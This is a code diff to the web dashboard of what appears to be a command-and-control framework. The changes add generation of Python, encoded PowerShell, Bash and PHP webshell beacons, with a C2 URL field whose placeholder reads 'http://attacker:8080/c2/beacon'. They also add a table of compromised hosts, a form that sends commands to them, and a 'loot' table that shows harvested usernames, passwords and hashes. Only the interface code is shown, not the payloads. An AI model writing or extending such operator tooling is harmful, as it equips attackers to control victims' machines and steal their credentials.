@@ -781,27 +781,22 @@
                             <div class="mb-3">
                                 <label class="form-label">Payload Type</label>
                                 <select id="payloadType" class="form-select">
-                                    <option value="python">Python Agent</option>
-                                    <option value="powershell">PowerShell</option>
-                                    <option value="go">Go Binary</option>
-                                    <option value="shellcode">Raw Shellcode</option>
+                                    <option value="python">Python Agent (Full)</option>
+                                    <option value="python_oneliner">Python One-liner</option>
+                                    <option value="powershell">PowerShell Agent</option>
+                                    <option value="powershell_encoded">PowerShell Encoded</option>
+                                    <option value="bash">Bash/Shell Agent</option>
+                                    <option value="php">PHP Beacon/Webshell</option>
                                 </select>
                             </div>
                             <div class="mb-3">
-                                <label class="form-label">Target Listener</label>
-                                <select id="payloadListener" class="form-select">
-                                    {% if listeners %}
-                                        {% for l in listeners %}
-                                        <option value="{{ l.listener_id }}">{{ l.name }} ({{ l.host }}:{{ l.port }})</option>
-                                        {% endfor %}
-                                    {% else %}
-                                        <option value="">No listeners available</option>
-                                    {% endif %}
-                                </select>
+                                <label class="form-label">C2 Server URL</label>
+                                <input type="text" id="payloadC2Url" class="form-control" placeholder="http://attacker:8080/c2/beacon">
+                                <small class="text-muted">Leave empty for current server</small>
                             </div>
                             <div class="mb-3">
                                 <label class="form-label">Sleep Interval (seconds)</label>
-                                <input type="number" id="payloadSleep" class="form-control" value="5">
+                                <input type="number" id="payloadSleep" class="form-control" value="30">
                             </div>
                             <div class="mb-4">
                                 <label class="form-label">Jitter (%)</label>
@@ -913,12 +908,61 @@ document.querySelectorAll('.sidebar-nav a').forEach(link => {
     });
 });
 
-async function refreshAgents() {
+// Load beacons on page load
+document.addEventListener('DOMContentLoaded', () => {
+    refreshBeacons();
+    loadStats();
+    loadLoot();
+});
+
+async function loadStats() {
     try {
-        const res = await fetch('/c2/agents');
+        const res = await fetch('/c2/stats');
         const data = await res.json();
-        document.getElementById('agentCount').textContent = data.agents?.length || 0;
-    } catch(e) { console.error(e); }
+        if (data.success) {
+            document.getElementById('agentCount').textContent = data.stats.active || 0;
+            // Update other stats if elements exist
+            const dormantEl = document.getElementById('dormantCount');
+            if (dormantEl) dormantEl.textContent = data.stats.dormant || 0;
+        }
+    } catch(e) { console.error('loadStats:', e); }
+}
+
+async function refreshBeacons() {
+    try {
+        const res = await fetch('/c2/beacons');
+        const data = await res.json();
+        document.getElementById('agentCount').textContent = data.beacons?.filter(b => b.status === 'active').length || 0;
+        
+        // Update agents table
+        const tbody = document.getElementById('agentsTable');
+        if (tbody && data.beacons?.length) {
+            tbody.innerHTML = data.beacons.map(beacon => `
+                <tr>
+                    <td><span style="font-family: monospace; color: var(--accent-purple);">${beacon.id?.substring(0,8) || 'N/A'}</span></td>
+                    <td>${beacon.hostname || 'Unknown'}</td>
+                    <td>${beacon.username || '-'}</td>
+                    <td>${beacon.ip_internal || beacon.ip_external || '-'}</td>
+                    <td>${beacon.os || '-'}</td>
+                    <td><span class="badge-status badge-${beacon.status || 'unknown'}">${beacon.status || 'unknown'}</span></td>
+                    <td>${beacon.last_seen || '-'}</td>
+                    <td>
+                        <button class="btn-ghost btn-sm" onclick="interactAgent('${beacon.id}')"><i class="bi bi-terminal"></i></button>
+                        <button class="btn-ghost btn-sm" onclick="killAgent('${beacon.id}')"><i class="bi bi-x-circle text-danger"></i></button>
+                    </td>
+                </tr>
+            `).join('');
+        } else if (tbody) {
+            tbody.innerHTML = `
+                <tr>
+                    <td colspan="8" class="text-center" style="padding: 3rem; color: var(--text-muted);">
+                        <i class="bi bi-cpu" style="font-size: 2rem; opacity: 0.3;"></i>
+                        <p class="mt-2 mb-0">No active beacons. Deploy an agent to get started.</p>
+                    </td>
+                </tr>
+            `;
+        }
+    } catch(e) { console.error('refreshBeacons:', e); }
 }
 
 async function createListener() {
@@ -952,7 +996,7 @@ function interactAgent(id) {
 
 async function loadAgentTasks(id) {
     try {
-        const res = await fetch('/c2/tasks?agent_id=' + id);
+        const res = await fetch('/c2/tasks?beacon_id=' + id);
         const data = await res.json();
         const el = document.getElementById('agentTaskHistory');
         if (data.tasks?.length) {
@@ -960,7 +1004,7 @@ async function loadAgentTasks(id) {
                 '<div style="padding: 0.75rem; background: var(--bg-dark); border-radius: 8px; margin-bottom: 0.5rem;">' +
                 '<code style="color: var(--accent-purple);">' + t.command + ' ' + (t.args||[]).join(' ') + '</code>' +
                 ' <span class="badge-status badge-' + t.status + '">' + t.status + '</span>' +
-                (t.output ? '<pre style="margin-top: 0.5rem; color: var(--accent-green); font-size: 0.8rem;">' + t.output + '</pre>' : '') +
+                (t.output ? '<pre style="margin-top: 0.5rem; color: var(--accent-green); font-size: 0.8rem; max-height: 150px; overflow: auto;">' + escapeHtml(t.output || '') + '</pre>' : '') +
                 '</div>'
             ).join('');
         } else { el.innerHTML = '<p style="color: var(--text-muted);">No tasks yet.</p>'; }
@@ -969,24 +1013,36 @@ async function loadAgentTasks(id) {
 
 async function sendTask() {
     try {
-        const res = await fetch('/c2/agents/' + currentAgentId + '/task', {
+        const args = document.getElementById('taskArgs').value.trim();
+        const res = await fetch('/c2/beacons/' + currentAgentId + '/task', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 command: document.getElementById('taskCommand').value,
-                args: document.getElementById('taskArgs').value.split(' ')
+                args: args ? args.split(' ') : []
             })
         });
         const data = await res.json();
-        if (data.success) { loadAgentTasks(currentAgentId); document.getElementById('taskArgs').value = ''; }
-        else { alert('Error: ' + data.error); }
+        if (data.success) { 
+            loadAgentTasks(currentAgentId); 
+            document.getElementById('taskArgs').value = ''; 
+            // Show success feedback
+            const btn = document.querySelector('#agentModal .btn-c2');
+            if (btn) {
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '<i class="bi bi-check"></i> Queued!';
+                btn.style.background = 'var(--accent-green)';
+                setTimeout(() => { btn.innerHTML = originalText; btn.style.background = ''; }, 1500);
+            }
+        }
+        else { alert('Error: ' + (data.error || 'Unknown error')); }
     } catch(e) { alert('Error: ' + e); }
 }
 
 async function killAgent(id) {
-    if(confirm('Kill agent?')) {
-        await fetch('/c2/agents/' + id + '/kill', { method: 'POST' });
-        location.reload();
+    if(confirm('Kill this beacon? This will send an exit command.')) {
+        await fetch('/c2/beacons/' + id + '/kill', { method: 'POST' });
+        refreshBeacons();
     }
 }
 
@@ -994,22 +1050,26 @@ async function generatePayload() {
     const output = document.getElementById('payloadOutput');
     output.innerHTML = '<span class="pulse" style="color: var(--accent-yellow);"># Generating payload...</span>';
     try {
+        const payloadType = document.getElementById('payloadType').value;
+        const sleep = parseInt(document.getElementById('payloadSleep').value) || 30;
+        const jitter = parseInt(document.getElementById('payloadJitter').value) || 10;
+        
         const res = await fetch('/c2/payloads/generate', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                type: document.getElementById('payloadType').value,
-                listener_id: document.getElementById('payloadListener').value,
+                type: payloadType,
+                c2_url: window.location.origin + '/c2/beacon',
                 options: {
-                    sleep_interval: parseInt(document.getElementById('payloadSleep').value),
-                    jitter: parseInt(document.getElementById('payloadJitter').value)
+                    sleep: sleep,
+                    jitter: jitter
                 }
             })
         });
         const data = await res.json();
-        if (data.payload) {
+        if (data.success && data.payload) {
             generatedPayload = data.payload;
-            output.innerHTML = '<pre style="margin: 0; white-space: pre-wrap;">' + escapeHtml(data.payload) + '</pre>';
+            output.innerHTML = '<pre style="margin: 0; white-space: pre-wrap; max-height: 400px; overflow: auto;">' + escapeHtml(data.payload) + '</pre>';
         } else {
             output.innerHTML = '<span style="color: var(--accent-red);"># Error: ' + (data.error || 'Unknown error') + '</span>';
         }
@@ -1020,20 +1080,50 @@ async function generatePayload() {
 
 function copyPayload() {
     if(generatedPayload) {
-        navigator.clipboard.writeText(generatedPayload);
-        alert('Copied to clipboard!');
+        navigator.clipboard.writeText(generatedPayload).then(() => {
+            const btn = document.querySelector('[onclick="copyPayload()"]');
+            if (btn) {
+                const orig = btn.innerHTML;
+                btn.innerHTML = '<i class="bi bi-check"></i> Copied!';
+                setTimeout(() => btn.innerHTML = orig, 1500);
+            }
+        });
     }
 }
 
 function downloadPayload() {
     if(!generatedPayload) return;
     const type = document.getElementById('payloadType').value;
-    const ext = type === 'powershell' ? 'ps1' : type === 'python' ? 'py' : 'txt';
+    const extMap = {
+        'python': 'py', 'python_oneliner': 'txt',
+        'powershell': 'ps1', 'powershell_encoded': 'txt',
+        'bash': 'sh', 'php': 'php'
+    };
+    const ext = extMap[type] || 'txt';
     const blob = new Blob([generatedPayload], {type: 'text/plain'});
     const a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
-    a.download = 'payload.' + ext;
+    a.download = 'beacon_' + type + '.' + ext;
     a.click();
+}
+
+async function loadLoot() {
+    try {
+        const res = await fetch('/c2/loot');
+        const data = await res.json();
+        const tbody = document.getElementById('credsTable');
+        if (tbody && data.loot?.length) {
+            tbody.innerHTML = data.loot.map(l => `
+                <tr>
+                    <td><span class="badge-status badge-info">${l.type || 'unknown'}</span></td>
+                    <td>${l.domain || '-'}</td>
+                    <td><code>${l.username || '-'}</code></td>
+                    <td><code style="color: var(--accent-green);">${l.value || l.hash || '-'}</code></td>
+                    <td>${l.source || 'beacon'}</td>
+                </tr>
+            `).join('');
+        }
+    } catch(e) { console.error('loadLoot:', e); }
 }
 
 function escapeHtml(text) {
@@ -1046,7 +1136,10 @@ function showOutput(taskId) {
     alert('Task ID: ' + taskId);
 }
 
-// Auto refresh
-setInterval(refreshAgents, 30000);
+// Auto refresh every 15 seconds
+setInterval(() => {
+    refreshBeacons();
+    loadStats();
+}, 15000);
 </script>
 {% endblock %}
